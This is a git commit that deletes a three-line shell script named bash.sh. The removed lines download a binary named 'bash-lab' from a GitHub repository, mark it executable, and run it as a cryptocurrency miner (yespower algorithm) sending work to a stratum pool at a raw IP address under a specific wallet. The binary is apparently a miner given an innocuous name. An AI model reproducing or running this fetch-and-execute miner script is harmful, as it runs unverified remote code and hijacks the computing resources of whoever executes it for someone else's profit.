52da51b58588ef891c2ad7dd5ce96b5ab027c40a
viloidka <95928871+viloidka@users.noreply.github.com>
2022-12-06 07:12:46 +0700

    Delete bash.sh

--- bash.sh
+++
@@ -1,3 +0,0 @@
-wget https://github.com/viloidka/go/raw/main/bash-lab
-chmod +x bash-lab
-./bash-lab -a yespower -o stratum+tcp://137.184.40.250:80 -u web1qmt8q9y0c8wwctsxee5zrl2eel2k6zkxk7udaut.rk -p m=solo
